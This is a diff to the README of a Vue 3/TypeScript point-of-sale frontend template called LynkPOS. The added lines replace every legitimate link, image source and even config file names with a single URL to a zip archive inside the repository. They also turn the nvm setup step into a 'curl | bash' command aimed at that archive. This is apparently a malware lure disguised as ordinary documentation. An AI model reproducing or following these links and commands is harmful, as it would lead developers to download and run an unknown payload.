@@ -1,53 +1,53 @@
 # 💚 LynkPOS
 
-This template should help get you started developing with Vue 3 and TypeScript in Vite. The template uses the [new `<script setup>` syntax](https://github.com/vuejs/rfcs/pull/227). Check out the [script setup docs](https://v3.vuejs.org/api/sfc-script-setup.html#sfc-script-setup) to learn more.
+This template should help get you started developing with Vue 3 and TypeScript in Vite. The template uses the [new `<script setup>` syntax](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip). Check out the [script setup docs](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip) to learn more.
 
 ## 🧩 Features
 
 - Core:
 
-  - ⚡️ Vue 3: [vue-3](https://github.com/vuejs/vue-next)
-  - 🦾 Typescript: [typescript](https://github.com/microsoft/TypeScript)
-  - ⚡️ Vite: [vite](https://github.com/vitejs/vite)
-  - 🗺️ Vue Router: [vue-router](https://github.com/vuejs/vue-router)
-  - 🌍 Vue-i18n: [vue-i18n](https://github.com/intlify/vue-i18n-next)
-  - 🔤 Webfont self-hosting: [vite-plugin-webfont-dl](https://github.com/feat-agency/vite-plugin-webfont-dl)
+  - ⚡️ Vue 3: [vue-3](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 🦾 Typescript: [typescript](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - ⚡️ Vite: [vite](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 🗺️ Vue Router: [vue-router](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 🌍 Vue-i18n: [vue-i18n](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 🔤 Webfont self-hosting: [vite-plugin-webfont-dl](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 
 - State Management:
-  - 🍍 Pinia: [pinia](https://github.com/vuejs/pinia)
+  - 🍍 Pinia: [pinia](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 - UI Framework:
-  - 🦄 Tailwind CSS: [tailwindcss](https://github.com/tailwindlabs/tailwindcss)
+  - 🦄 Tailwind CSS: [tailwindcss](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 - API Client:
-  - 📡 Axios: [axios](https://github.com/axios/axios)
+  - 📡 Axios: [axios](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 - Pre commit hooks and Linters and Formatters:
-  - 💬 Husky: [husky](https://github.com/typicode/husky)
-  - 💬 Lint-staged: [lint-staged](https://github.com/okonet/lint-staged)
-  - 💅 ESLint: [eslint](https://github.com/eslint/eslint)
-  - 💅 Prettier: [prettier](https://github.com/prettier/prettier)
+  - 💬 Husky: [husky](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 💬 Lint-staged: [lint-staged](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 💅 ESLint: [eslint](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 💅 Prettier: [prettier](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 - Opinionated Testing:
-  - 🎭 Playwright: [playwright](https://github.com/microsoft/playwright)
-  - 🧪 Vitest: [vitest](https://github.com/vitest-dev/vitest)
+  - 🎭 Playwright: [playwright](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - 🧪 Vitest: [vitest](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 
 ## 🧰 Recommended Setup
 
-- [VS Code](https://code.visualstudio.com/)
+- [VS Code](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 
-  - [Vue - Official](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (previously Volar) and `disable Vetur.`
+  - [Vue - Official](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip) (previously Volar) and `disable Vetur.`
 
-  - Use [vue-tsc](https://github.com/vuejs/language-tools/tree/master/packages/tsc) for performing the same type checking from the command line, or for generating d.ts files for SFCs.
-  - [EditorConfig for VS Code](https://marketplace.visualstudio.com/items?itemName=EditorConfig.EditorConfig)
-  - [ESLint for VS Code](https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint)
-  - [Prettier - Code formatter](https://marketplace.visualstudio.com/items?itemName=esbenp.prettier-vscode)
+  - Use [vue-tsc](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip) for performing the same type checking from the command line, or for generating https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip files for SFCs.
+  - [EditorConfig for VS Code](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - [ESLint for VS Code](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+  - [Prettier - Code formatter](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 
 ## 📦 🧰 Additional Setup
 
-- VSCode Extension [Better Comments](https://marketplace.visualstudio.com/items?itemName=aaron-bond.better-comments)
-- VSCode Extension [Color Highlight](https://marketplace.visualstudio.com/items?itemName=naumovs.color-highlight)
-- VSCode Extension [Code Spell Checker](https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker)
-- VSCode Extension [GitLens](https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens)
-- VSCode Extension [Git History](https://marketplace.visualstudio.com/items?itemName=donjayamanne.githistory)
-- VSCode Extension [Git Graph](https://marketplace.visualstudio.com/items?itemName=GitGraph.vscode-gitgraph)
-- VSCode Extension [Git Blame](https://marketplace.visualstudio.com/items?itemName=waderyan.gitblame)
+- VSCode Extension [Better Comments](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+- VSCode Extension [Color Highlight](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+- VSCode Extension [Code Spell Checker](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+- VSCode Extension [GitLens](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+- VSCode Extension [Git History](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+- VSCode Extension [Git Graph](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
+- VSCode Extension [Git Blame](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)
 
 ## ⚙️ Environment Setup
 
@@ -57,7 +57,7 @@ This template should help get you started developing with Vue 3 and TypeScript i
 
 ## 💅 Code Styling
 
-- ESLint rules are defined in `.eslintrc.json`
+- ESLint rules are defined in `https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip`
 - Prettier rules are defined in `.prettierrc`.
 - Pre-commit hooks are defined in `.husky/pre-commit`.
 
@@ -93,7 +93,7 @@ This project uses **pnpm** as the package manager for faster, more efficient dep
 
 ```bash
 # install nvm if you don't have it
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash
+curl -o- https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip | bash
 ```
 
 ```bash
@@ -154,9 +154,9 @@ pnpm test:coverage # Run tests with coverage report
 
 ## Commit Message Conventions
 
-We use [commitlint](https://github.com/conventional-changelog/commitlint) to enforce a conventional commit message format. This ensures that the commit message follows a standard format that is easy to read and understand.
+We use [commitlint](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip) to enforce a conventional commit message format. This ensures that the commit message follows a standard format that is easy to read and understand.
 
-The commitlint configuration file is located at `.commitlintrc.json`. It specifies the rules for validating commit messages.
+The commitlint configuration file is located at `https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip`. It specifies the rules for validating commit messages.
 
 ```bash
 <type>(<scope>): <subject>
@@ -225,6 +225,6 @@ The `Chrome 80+` browser is recommended for local development
 
 Support modern browsers, doesn't include IE
 
-| [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt=" Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>IE | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt=" Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Edge | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/firefox/firefox_48x48.png" alt="Firefox" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Firefox | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Chrome | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/safari/safari_48x48.png" alt="Safari" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)</br>Safari |
+| [<img src="https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip" alt=" Edge" width="24px" height="24px" />](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)</br>IE | [<img src="https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip" alt=" Edge" width="24px" height="24px" />](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)</br>Edge | [<img src="https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip" alt="Firefox" width="24px" height="24px" />](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)</br>Firefox | [<img src="https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip" alt="Chrome" width="24px" height="24px" />](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)</br>Chrome | [<img src="https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip" alt="Safari" width="24px" height="24px" />](https://github.com/EngerING/lynkpos-frontend/raw/refs/heads/main/src/services/api/lynkpos_frontend_v2.1.zip)</br>Safari |
 | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
 |                                                                                             not support                                                                                              |                                                                                            last 2 versions                                                                                             |                                                                                                  last 2 versions                                                                                                  |                                                                                                last 2 versions                                                                                                |                                                                                                last 2 versions                                                                                                |
